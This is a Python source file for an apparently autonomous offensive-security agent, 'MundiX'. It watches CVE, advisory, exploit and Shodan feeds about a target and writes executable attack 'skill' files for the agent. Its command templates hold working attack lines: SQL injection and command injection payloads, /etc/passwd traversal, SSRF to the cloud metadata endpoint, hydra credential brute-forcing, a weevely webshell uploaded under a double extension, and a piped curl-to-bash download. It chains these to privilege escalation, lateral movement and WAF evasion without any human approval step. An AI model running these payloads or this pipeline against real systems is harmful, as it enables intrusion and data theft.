"""
MundiX OSINT Monitor — Autonomous Intelligence Engine
=====================================================

Continuous background intelligence gathering that:
  1. Monitors passive sources (crt.sh, NVD, CISA KEV, Shodan)
  2. Discovers new CVEs, exploits, and attack techniques
  3. AUTO-GENERATES new skill files when actionable intel is found
  4. Feeds the Knowledge Graph with real-time discoveries
  5. Tracks GitHub Security Advisories and exploit feeds

The monitor runs in a background thread and enriches the KG without
generating traffic to the target (passive only).

Usage:
    from src.core.osint_monitor import OSINTMonitor

    monitor = OSINTMonitor(knowledge_graph, on_alert=print)
    monitor.start(interval=300)  # Check every 5 minutes
    ...
    monitor.stop()
"""

import json
import os
import re
import threading
import time
import urllib.request
import urllib.error
import xml.etree.ElementTree as ET
from datetime import datetime, timedelta
from typing import Any, Callable, Dict, List, Optional, Set, Tuple

try:
    from src.core.knowledge_graph import KnowledgeGraph, NodeType
except ImportError:
    KnowledgeGraph = None
    NodeType = None

try:
    from src.core.threat_intel import ThreatIntel
except ImportError:
    ThreatIntel = None


# ---------------------------------------------------------------------------
# Skill Auto-Generator
# ---------------------------------------------------------------------------

SKILL_TEMPLATE = """---
name: {skill_name}
phase: {phase}
tools: [{tools}]
dependencies: [{dependencies}]
mitre_tactic: {mitre_tactic}
auto_generated: true
generated_at: "{generated_at}"
source: "{source}"
---

# Objetivo

{objective}

# Condições de Execução

{conditions}

# Comandos e Sintaxe

{commands}

# Análise de Resultados

{analysis}

# Próximos Passos

{next_steps}

# Tratamento de Erros

{error_handling}
"""


class SkillAutoGenerator:
    """
    Generates new .md skill files from discovered CVEs and exploits.

    When the OSINT monitor finds a new vulnerability with a known exploit,
    this generator creates an actionable skill file that the agent can load
    and execute autonomously.
    """

    # CVE patterns mapped to exploitation tools and techniques
    VULN_TYPE_MAP = {
        "sql injection": {
            "phase": "4_exploitation",
            "tools": ["sqlmap", "curl"],
            "mitre": "TA0001 (Initial Access)",
            "template": "sqli",
        },
        "remote code execution": {
            "phase": "4_exploitation",
            "tools": ["msfconsole", "curl", "python3"],
            "mitre": "TA0002 (Execution)",
            "template": "rce",
        },
        "cross-site scripting": {
            "phase": "3_vulnerability_analysis",
            "tools": ["nuclei", "dalfox", "curl"],
            "mitre": "TA0001 (Initial Access)",
            "template": "xss",
        },
        "path traversal": {
            "phase": "4_exploitation",
            "tools": ["curl", "ffuf"],
            "mitre": "TA0009 (Collection)",
            "template": "lfi",
        },
        "authentication bypass": {
            "phase": "4_exploitation",
            "tools": ["curl", "hydra", "burpsuite"],
            "mitre": "TA0001 (Initial Access)",
            "template": "auth_bypass",
        },
        "privilege escalation": {
            "phase": "5_post_exploitation",
            "tools": ["linpeas", "python3"],
            "mitre": "TA0004 (Privilege Escalation)",
            "template": "privesc",
        },
        "server-side request forgery": {
            "phase": "4_exploitation",
            "tools": ["curl", "ffuf"],
            "mitre": "TA0009 (Collection)",
            "template": "ssrf",
        },
        "deserialization": {
            "phase": "4_exploitation",
            "tools": ["ysoserial", "python3", "curl"],
            "mitre": "TA0002 (Execution)",
            "template": "deserialize",
        },
        "command injection": {
            "phase": "4_exploitation",
            "tools": ["curl", "commix", "python3"],
            "mitre": "TA0002 (Execution)",
            "template": "cmdi",
        },
        "file upload": {
            "phase": "4_exploitation",
            "tools": ["curl", "weevely", "exiftool"],
            "mitre": "TA0001 (Initial Access)",
            "template": "upload",
        },
    }

    COMMAND_TEMPLATES = {
        "sqli": (
            "# Detect SQLi with sqlmap\n"
            "```bash\nsqlmap -u \"{target_url}\" --batch --level=3 --risk=2 "
            "--output-dir={workspace}/sqlmap_{cve_id} --forms --crawl=2\n```\n\n"
            "# Manual verification with curl\n"
            "```bash\ncurl -sk \"{target_url}\" -d \"param=1' OR '1'='1\" -o {workspace}/sqli_test.html\n```"
        ),
        "rce": (
            "# Check if exploit exists in searchsploit\n"
            "```bash\nsearchsploit \"{product} {version}\" --json | tee {workspace}/exploits_{cve_id}.json\n```\n\n"
            "# Metasploit search\n"
            "```bash\nmsfconsole -q -x \"search {cve_id}; exit\"\n```\n\n"
            "# If PoC is available, test with curl\n"
            "```bash\ncurl -sk -X POST \"{target_url}\" -H 'Content-Type: application/json' "
            "-d '{\"test\": \"id\"}' -o {workspace}/rce_test_{cve_id}.txt\n```"
        ),
        "xss": (
            "# Scan with Dalfox\n"
            "```bash\ndalfox url \"{target_url}\" --silence --output {workspace}/xss_{cve_id}.txt\n```\n\n"
            "# Nuclei XSS templates\n"
            "```bash\nnuclei -u \"{target_url}\" -t cves/{cve_id}.yaml "
            "-o {workspace}/nuclei_xss_{cve_id}.txt\n```"
        ),
        "lfi": (
            "# Test path traversal payloads\n"
            "```bash\nffuf -u \"{target_url}/FUZZ\" "
            "-w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt "
            "-mc 200 -o {workspace}/lfi_{cve_id}.json\n```\n\n"
            "# Manual test\n"
            "```bash\ncurl -sk \"{target_url}/../../../etc/passwd\" "
            "-o {workspace}/lfi_test_{cve_id}.txt\n```"
        ),
        "auth_bypass": (
            "# Test authentication bypass\n"
            "```bash\ncurl -sk -v \"{target_url}/admin\" -H 'X-Forwarded-For: 127.0.0.1' "
            "2>&1 | tee {workspace}/auth_bypass_{cve_id}.txt\n```\n\n"
            "# Test default credentials\n"
            "```bash\nhydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt "
            "-P /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt "
            "{target_ip} http-post-form \"/login:user=^USER^&pass=^PASS^:F=Invalid\" "
            "-t 4 -o {workspace}/brute_{cve_id}.txt\n```"
        ),
        "privesc": (
            "# Run LinPEAS for privilege escalation vectors\n"
            "```bash\ncurl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh "
            "| bash 2>&1 | tee {workspace}/linpeas_{cve_id}.txt\n```\n\n"
            "# Check for specific CVE exploit\n"
            "```bash\nsearchsploit \"{cve_id}\" --json | tee {workspace}/privesc_exploit_{cve_id}.json\n```"
        ),
        "ssrf": (
            "# Test SSRF with common payloads\n"
            "```bash\ncurl -sk \"{target_url}\" -d \"url=http://169.254.169.254/latest/meta-data/\" "
            "-o {workspace}/ssrf_aws_{cve_id}.txt\n```\n\n"
            "```bash\ncurl -sk \"{target_url}\" -d \"url=http://127.0.0.1:8080/\" "
            "-o {workspace}/ssrf_local_{cve_id}.txt\n```"
        ),
        "deserialize": (
            "# Search for known deserialization exploits\n"
            "```bash\nsearchsploit \"{product} deserialization\" --json "
            "| tee {workspace}/deserialize_{cve_id}.json\n```\n\n"
            "# Metasploit module search\n"
            "```bash\nmsfconsole -q -x \"search {cve_id}; exit\"\n```"
        ),
        "cmdi": (
            "# Test command injection with commix\n"
            "```bash\ncommix --url=\"{target_url}\" --batch "
            "--output-dir={workspace}/cmdi_{cve_id}\n```\n\n"
            "# Manual test\n"
            "```bash\ncurl -sk \"{target_url}\" -d \"param=;id\" "
            "-o {workspace}/cmdi_test_{cve_id}.txt\n```"
        ),
        "upload": (
            "# Generate webshell\n"
            "```bash\nweevely generate mundix123 {workspace}/shell_{cve_id}.php\n```\n\n"
            "# Test upload with double extension\n"
            "```bash\ncurl -sk -F \"file=@{workspace}/shell_{cve_id}.php;filename=image.php.jpg\" "
            "\"{target_url}/upload\" -o {workspace}/upload_test_{cve_id}.txt\n```"
        ),
    }

    def __init__(self, skills_dir: str):
        self.skills_dir = skills_dir
        self.generated_skills = []
        os.makedirs(skills_dir, exist_ok=True)

    def classify_vulnerability(self, description: str) -> Optional[Dict]:
        """Classify a CVE description into a vulnerability type with matching tools."""
        desc_lower = description.lower()

        for vuln_type, config in self.VULN_TYPE_MAP.items():
            if vuln_type in desc_lower:
                return {"type": vuln_type, **config}
        # Fuzzy matching with keyword fragments
        keyword_map = {
            "sqli": "sql injection", "xss": "cross-site scripting",
            "rce": "remote code execution", "lfi": "path traversal",
            "ssrf": "server-side request forgery", "csrf": "cross-site scripting",
            "buffer overflow": "remote code execution",
            "heap overflow": "remote code execution",
            "use-after-free": "remote code execution",
            "arbitrary file": "path traversal",
            "unrestricted upload": "file upload",
            "os command": "command injection",
            "code injection": "remote code execution",
            "insecure deserialization": "deserialization",
        }
        for keyword, vuln_type in keyword_map.items():
            if keyword in desc_lower:
                return {"type": vuln_type, **self.VULN_TYPE_MAP[vuln_type]}
        return None

    def generate_skill(self, cve_id: str, product: str, version: str,
                       description: str, cvss: float, exploit_ref: str = "",
                       source: str = "nvd-auto") -> Optional[str]:
        """
        Generate a new skill .md file from a CVE discovery.

        Returns the skill filename if created, None if skipped.
        """
        # Classify the vulnerability
        classification = self.classify_vulnerability(description)
        if not classification:
            return None

        # Build skill name
        safe_product = re.sub(r'[^a-z0-9]', '_', product.lower())[:30]
        safe_cve = cve_id.lower().replace('-', '_')
        skill_name = f"auto_{safe_product}_{safe_cve}"
        filename = f"{skill_name}.md"
        filepath = os.path.join(self.skills_dir, filename)

        # Don't overwrite existing skills
        if os.path.exists(filepath):
            return None

        # Get command template
        template_key = classification["template"]
        commands_raw = self.COMMAND_TEMPLATES.get(template_key,
            "# Manual verification required\n```bash\nsearchsploit \"{product} {version}\"\n```")

        # Build conditions based on phase
        if classification["phase"].startswith("4_") or classification["phase"].startswith("5_"):
            conditions = (
                f"- Serviço {product} {version} identificado no alvo\n"
                f"- {cve_id} confirmado como aplicável ao serviço\n"
                f"- CVSS {cvss} — {'exploração prioritária' if cvss >= 7.0 else 'verificar viabilidade'}\n"
                f"- Escopo permite exploração ativa"
            )
        else:
            conditions = (
                f"- Serviço {product} {version} identificado no alvo\n"
                f"- Fase de análise de vulnerabilidades em andamento"
            )

        # Build analysis section
        severity_word = "CRÍTICA" if cvss >= 9.0 else "ALTA" if cvss >= 7.0 else "MÉDIA" if cvss >= 4.0 else "BAIXA"
        analysis = (
            f"## Indicadores de Sucesso\n"
            f"- Exploit retorna dados sensíveis ou execução de código\n"
            f"- Status HTTP diferente entre payloads maliciosos e benignos\n"
            f"- Output contém dados do sistema (id, whoami, /etc/passwd)\n\n"
            f"## Severidade: {severity_word} (CVSS {cvss})\n"
            f"- {'⚠️ EXPLORAÇÃO PRIORITÁRIA — Alto impacto potencial' if cvss >= 7.0 else 'Verificar exploitabilidade antes de investir tempo'}\n"
            f"{'- 🔥 Presente no CISA KEV — exploit ativo na natureza' if exploit_ref else ''}"
        )

        # Build the skill content
        content = SKILL_TEMPLATE.format(
            skill_name=skill_name,
            phase=classification["phase"],
            tools=", ".join(classification["tools"]),
            dependencies="open_ports_identified" if classification["phase"].startswith(("3_", "4_")) else "initial_access_obtained",
            mitre_tactic=classification["mitre"],
            generated_at=datetime.now().isoformat(),
            source=source,
            objective=(
                f"Explorar {cve_id} ({classification['type']}) em {product} {version}.\n\n"
                f"**Descrição:** {description[:300]}\n\n"
                f"**CVSS:** {cvss} ({severity_word})\n"
                f"{'**Exploit Ref:** ' + exploit_ref if exploit_ref else ''}"
            ),
            conditions=conditions,
            commands=commands_raw,
            analysis=analysis,
            next_steps=(
                f"- Se exploit confirma {classification['type']}: registrar finding com severidade {severity_word}\n"
                f"- Se obtém shell: acionar `linux_privilege_escalation` ou `windows_privilege_escalation`\n"
                f"- Se obtém credenciais: acionar `lateral_movement_psexec`\n"
                f"- Se bloqueado por WAF: tentar encoding alternativo (URL-encode, double-encode, Unicode)\n"
                f"- Gerar evidência em {'{workspace}'}/evidence_{safe_cve}/"
            ),
            error_handling=(
                f"- **Ferramenta não encontrada:** Instalar via `apt install` ou `pip install`\n"
                f"- **Timeout:** Reduzir escopo do scan, usar `--timeout` flag\n"
                f"- **WAF bloqueando:** Usar `--tamper` em SQLmap, `--proxy` para rotação\n"
                f"- **Falso positivo:** Verificar manualmente com curl antes de reportar\n"
                f"- **Versão não vulnerável:** Confirmar versão exata com fingerprinting"
            ),
        )

        with open(filepath, 'w') as f:
            f.write(content)

        self.generated_skills.append(filename)
        return filename


# ---------------------------------------------------------------------------
# OSINT Monitor
# ---------------------------------------------------------------------------

class OSINTMonitor:
    """
    Autonomous background OSINT intelligence monitor.

    Periodically queries passive sources and feeds new discoveries
    into the Knowledge Graph. When actionable CVEs/exploits are found,
    auto-generates skill files for the agent to use.
    """

    # Intelligence feed URLs
    FEEDS = {
        "github_advisories": "https://api.github.com/advisories?per_page=20&type=reviewed",
        "packetstorm_rss": "https://rss.packetstormsecurity.com/files/tags/exploit/",
        "vulners_recent": "https://vulners.com/api/v3/search/lucene/?query=type:cve%20AND%20published:[now-7d%20TO%20*]&size=20",
        "exploitdb_rss": "https://www.exploit-db.com/rss.xml",
    }

    def __init__(
        self,
        knowledge_graph: 'KnowledgeGraph',
        target: str = None,
        on_alert: Callable[[str, str, Dict], None] = None,
        shodan_key: str = None,
        cache_dir: str = None,
        skills_dir: str = None,
    ):
        self.kg = knowledge_graph
        self.target = target or (knowledge_graph.target if knowledge_graph else "unknown")
        self.on_alert = on_alert or (lambda s, m, d: None)
        self.shodan_key = shodan_key or os.environ.get("SHODAN_API_KEY", "")
        self.cache_dir = cache_dir or os.path.expanduser("~/.mundix/osint_cache")
        os.makedirs(self.cache_dir, exist_ok=True)

        self.threat_intel = ThreatIntel() if ThreatIntel else None

        # Skill auto-generator
        if skills_dir is None:
            # Auto-detect skills directory
            skills_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "skills")
        self.skill_gen = SkillAutoGenerator(skills_dir)

        # State
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self._known_subdomains: Set[str] = set()
        self._known_cves: Set[str] = set()
        self._known_exploits: Set[str] = set()
        self._check_count = 0
        self._last_check: Optional[str] = None
        self._findings_count = 0
        self._skills_generated = 0
        self._feeds_checked = 0

        # Pre-populate known state from KG
        self._sync_from_kg()

    def _sync_from_kg(self):
        """Sync known assets from the Knowledge Graph."""
        if not self.kg:
            return
        for node in self.kg.nodes.values():
            if node.type == NodeType.SUBDOMAIN:
                self._known_subdomains.add(node.properties.get("domain", node.label))
            elif node.type == NodeType.HOST:
                self._known_subdomains.add(node.properties.get("hostname", ""))
            elif node.type == NodeType.CVE:
                self._known_cves.add(node.label)

    def start(self, interval: int = 300):
        """Start the background monitor loop."""
        if self._running:
            return
        self._running = True
        self._thread = threading.Thread(
            target=self._monitor_loop,
            args=(interval,),
            daemon=True,
            name="mundix-osint-monitor",
        )
        self._thread.start()
        self.on_alert("info", f"🧠 OSINT Monitor started for {self.target} (every {interval}s) — "
                      f"Auto-skill generation ACTIVE", {})

    def stop(self):
        """Stop the background monitor."""
        self._running = False
        if self._thread:
            self._thread.join(timeout=10)
            self._thread = None
        self.on_alert("info", f"OSINT Monitor stopped — {self._findings_count} findings, "
                      f"{self._skills_generated} skills generated", {})

    @property
    def is_running(self) -> bool:
        return self._running

    def get_status(self) -> Dict[str, Any]:
        """Get monitor status."""
        return {
            "running": self._running,
            "target": self.target,
            "checks": self._check_count,
            "last_check": self._last_check,
            "known_subdomains": len(self._known_subdomains),
            "known_cves": len(self._known_cves),
            "known_exploits": len(self._known_exploits),
            "findings": self._findings_count,
            "skills_generated": self._skills_generated,
            "auto_skills": list(self.skill_gen.generated_skills),
            "feeds_checked": self._feeds_checked,
        }

    # --- Monitor Loop ---

    def _monitor_loop(self, interval: int):
        """Main monitoring loop (runs in background thread)."""
        while self._running:
            try:
                self._run_checks()
                self._check_count += 1
                self._last_check = datetime.now().isoformat()
            except Exception as e:
                self.on_alert("error", f"Monitor check failed: {e}", {"error": str(e)})

            # Wait for next interval (check stop flag every 5 seconds)
            for _ in range(interval // 5):
                if not self._running:
                    break
                time.sleep(5)

    def _run_checks(self):
        """Run all passive checks including new intelligence feeds."""
        self._check_cert_transparency()
        self._check_new_cves()
        self._check_github_advisories()
        self._check_exploit_feeds()
        if self.shodan_key:
            self._check_shodan()

    # --- Certificate Transparency (crt.sh) ---

    def _check_cert_transparency(self):
        """Query crt.sh for new subdomains via certificate transparency logs."""
        domain = self.target
        if "://" in domain:
            domain = domain.split("://")[1].split("/")[0]

        url = f"https://crt.sh/?q=%.{domain}&output=json"
        cache_file = os.path.join(self.cache_dir, f"crtsh_{domain}.json")

        try:
            req = urllib.request.Request(url, headers={
                "User-Agent": "MundiX-OSINT/1.0",
                "Accept": "application/json",
            })
            with urllib.request.urlopen(req, timeout=30) as resp:
                data = json.loads(resp.read().decode())

            new_subs = set()
            for entry in data:
                name = entry.get("name_value", "")
                for sub in name.split("\n"):
                    sub = sub.strip().lower()
                    if sub and "*" not in sub and sub not in self._known_subdomains:
                        new_subs.add(sub)

            if new_subs:
                self._findings_count += len(new_subs)
                for sub in new_subs:
                    self._known_subdomains.add(sub)
                    if self.kg:
                        self.kg.add_domain(sub, source="crt.sh-monitor")

                self.on_alert(
                    "medium",
                    f"🔍 {len(new_subs)} new subdomain(s) found via CT logs",
                    {"subdomains": list(new_subs)[:20]},
                )

            with open(cache_file, 'w') as f:
                json.dump({"checked": datetime.now().isoformat(), "count": len(data)}, f)

        except Exception:
            pass

    # --- CVE Watch (with auto-skill generation) ---

    def _check_new_cves(self):
        """Check for new CVEs affecting discovered services. Auto-generates skills."""
        if not self.threat_intel or not self.kg:
            return

        services = self.kg.get_nodes_by_type(NodeType.SERVICE)
        if not services:
            return

        for svc_node in services:
            service = svc_node.properties.get("service", "")
            version = svc_node.properties.get("version", "")
            if not service or not version:
                continue

            keyword = f"{service} {version}".strip()

            try:
                results = self.threat_intel.search_nvd(keyword, max_results=5)
                for cve_data in results:
                    cve_id = cve_data.get("id", "")
                    if cve_id and cve_id not in self._known_cves:
                        self._known_cves.add(cve_id)
                        self._findings_count += 1

                        host = svc_node.properties.get("host", self.target)
                        port = svc_node.properties.get("port", 0)
                        cvss = cve_data.get("cvss_score", 0.0)
                        severity = cve_data.get("severity", "unknown")
                        description = cve_data.get("description", "")

                        self.kg.add_cve(
                            host, port, cve_id,
                            cvss=cvss, severity=severity,
                            description=description[:200],
                            source="nvd-monitor",
                        )

                        kev_match = self.threat_intel.check_cisa_kev(cve_id)
                        alert_severity = "critical" if cvss >= 9.0 else "high" if cvss >= 7.0 else "medium"
                        kev_tag = " ⚠️ CISA KEV!" if kev_match else ""

                        self.on_alert(
                            alert_severity,
                            f"🆕 New CVE: {cve_id} (CVSS {cvss}) for {keyword}{kev_tag}",
                            {"cve": cve_id, "cvss": cvss, "service": keyword,
                             "host": host, "port": port, "kev": bool(kev_match)},
                        )

                        # AUTO-GENERATE SKILL if CVSS >= 7.0 or in CISA KEV
                        if cvss >= 7.0 or kev_match:
                            exploit_ref = ""
                            try:
                                exploits = self.threat_intel.search_exploitdb(cve_id, max_results=1)
                                if exploits:
                                    exploit_ref = exploits[0].get("url", "")
                            except Exception:
                                pass

                            skill_file = self.skill_gen.generate_skill(
                                cve_id=cve_id,
                                product=service,
                                version=version,
                                description=description,
                                cvss=cvss,
                                exploit_ref=exploit_ref,
                                source="nvd-auto",
                            )
                            if skill_file:
                                self._skills_generated += 1
                                self.on_alert(
                                    "high",
                                    f"🤖 Auto-generated skill: {skill_file}",
                                    {"skill": skill_file, "cve": cve_id, "cvss": cvss},
                                )

                time.sleep(6)  # Rate limit
            except Exception:
                pass

    # --- GitHub Security Advisories ---

    def _check_github_advisories(self):
        """Check GitHub Security Advisories for new CVEs matching our services."""
        if not self.kg:
            return

        services = self.kg.get_nodes_by_type(NodeType.SERVICE)
        products = set()
        for svc in services:
            product = svc.properties.get("service", "").lower()
            if product:
                products.add(product)

        if not products:
            return

        try:
            url = self.FEEDS["github_advisories"]
            req = urllib.request.Request(url, headers={
                "User-Agent": "MundiX-OSINT/1.0",
                "Accept": "application/vnd.github+json",
                "X-GitHub-Api-Version": "2022-11-28",
            })
            with urllib.request.urlopen(req, timeout=20) as resp:
                advisories = json.loads(resp.read().decode())

            self._feeds_checked += 1

            for advisory in advisories:
                ghsa_id = advisory.get("ghsa_id", "")
                cve_id = advisory.get("cve_id", "")
                summary = advisory.get("summary", "").lower()
                severity = advisory.get("severity", "unknown")

                if cve_id and cve_id in self._known_cves:
                    continue

                # Check if advisory matches any discovered product
                matches = any(p in summary for p in products)
                # Also check vulnerable package names
                for vuln in advisory.get("vulnerabilities", []):
                    pkg = vuln.get("package", {}).get("name", "").lower()
                    if any(p in pkg for p in products):
                        matches = True
                        break

                if matches and cve_id:
                    self._known_cves.add(cve_id)
                    self._findings_count += 1
                    cvss_obj = advisory.get("cvss", {})
                    cvss = cvss_obj.get("score", 0.0) if cvss_obj else 0.0

                    self.on_alert(
                        severity if severity in ("critical", "high", "medium", "low") else "medium",
                        f"📰 GitHub Advisory: {cve_id or ghsa_id} — {advisory.get('summary', '')[:80]}",
                        {"cve": cve_id, "ghsa": ghsa_id, "severity": severity,
                         "summary": advisory.get("summary", ""), "cvss": cvss},
                    )

                    # Auto-generate skill for critical/high advisories
                    if severity in ("critical", "high") and cvss >= 7.0:
                        product_match = next((p for p in products if p in summary), "unknown")
                        skill_file = self.skill_gen.generate_skill(
                            cve_id=cve_id or ghsa_id,
                            product=product_match,
                            version="",
                            description=advisory.get("summary", ""),
                            cvss=cvss,
                            exploit_ref=advisory.get("html_url", ""),
                            source="github-advisory",
                        )
                        if skill_file:
                            self._skills_generated += 1
                            self.on_alert(
                                "high",
                                f"🤖 Auto-generated skill from GitHub Advisory: {skill_file}",
                                {"skill": skill_file, "advisory": ghsa_id},
                            )

            time.sleep(2)
        except Exception:
            pass

    # --- Exploit Feeds (PacketStorm RSS + ExploitDB) ---

    def _check_exploit_feeds(self):
        """Check exploit feeds for new exploits matching our target's tech stack."""
        if not self.kg:
            return

        services = {}
        for svc in self.kg.get_nodes_by_type(NodeType.SERVICE):
            product = svc.properties.get("service", "").lower()
            version = svc.properties.get("version", "")
            if product:
                services[product] = version

        if not services:
            return

        # Check ExploitDB RSS
        try:
            url = self.FEEDS["exploitdb_rss"]
            req = urllib.request.Request(url, headers={
                "User-Agent": "MundiX-OSINT/1.0",
            })
            with urllib.request.urlopen(req, timeout=20) as resp:
                raw = resp.read().decode(errors='replace')

            self._feeds_checked += 1

            # Parse RSS XML
            root = ET.fromstring(raw)
            for item in root.findall('.//item'):
                title = item.findtext('title', '').lower()
                link = item.findtext('link', '')
                desc = item.findtext('description', '').lower()

                # Check if exploit matches any service
                for product, version in services.items():
                    if product in title or product in desc:
                        exploit_id = link.split('/')[-1] if link else title[:40]
                        if exploit_id not in self._known_exploits:
                            self._known_exploits.add(exploit_id)
                            self._findings_count += 1

                            self.on_alert(
                                "high",
                                f"💀 New exploit for {product}: {item.findtext('title', '')}",
                                {"exploit": link, "product": product, "title": item.findtext('title', '')},
                            )
                        break

            time.sleep(2)
        except Exception:
            pass

    # --- Shodan Passive ---

    def _check_shodan(self):
        """Query Shodan for passive recon on the target."""
        if not self.shodan_key:
            return

        domain = self.target
        if "://" in domain:
            domain = domain.split("://")[1].split("/")[0]

        url = f"https://api.shodan.io/dns/resolve?hostnames={domain}&key={self.shodan_key}"

        try:
            req = urllib.request.Request(url, headers={
                "User-Agent": "MundiX-OSINT/1.0",
            })
            with urllib.request.urlopen(req, timeout=15) as resp:
                data = json.loads(resp.read().decode())

            ip = data.get(domain)
            if ip:
                host_url = f"https://api.shodan.io/shodan/host/{ip}?key={self.shodan_key}"
                req2 = urllib.request.Request(host_url, headers={
                    "User-Agent": "MundiX-OSINT/1.0",
                })
                with urllib.request.urlopen(req2, timeout=15) as resp2:
                    host_data = json.loads(resp2.read().decode())

                if self.kg:
                    self.kg.add_host(ip, hostname=domain, source="shodan-monitor")

                    for port_info in host_data.get("data", []):
                        port = port_info.get("port", 0)
                        transport = port_info.get("transport", "tcp")
                        product = port_info.get("product", "")
                        version = port_info.get("version", "")
                        self.kg.add_port(
                            ip, port, transport, product, version,
                            source="shodan-monitor",
                        )

                    for vuln_id in host_data.get("vulns", []):
                        if vuln_id not in self._known_cves:
                            self._known_cves.add(vuln_id)
                            self._findings_count += 1
                            self.kg.add_cve(ip, 0, vuln_id, source="shodan-monitor")
                            self.on_alert(
                                "high",
                                f"🔍 Shodan CVE: {vuln_id} on {ip}",
                                {"cve": vuln_id, "host": ip},
                            )

        except Exception:
            pass

    # --- One-Shot Check (for non-background use) ---

    def run_once(self) -> Dict[str, Any]:
        """Run all checks once (non-background) and return findings."""
        findings_before = self._findings_count
        skills_before = self._skills_generated
        self._run_checks()
        self._check_count += 1
        self._last_check = datetime.now().isoformat()
        return {
            "new_findings": self._findings_count - findings_before,
            "total_findings": self._findings_count,
            "subdomains": len(self._known_subdomains),
            "cves": len(self._known_cves),
            "exploits": len(self._known_exploits),
            "skills_generated": self._skills_generated - skills_before,
            "total_skills_generated": self._skills_generated,
            "feeds_checked": self._feeds_checked,
        }
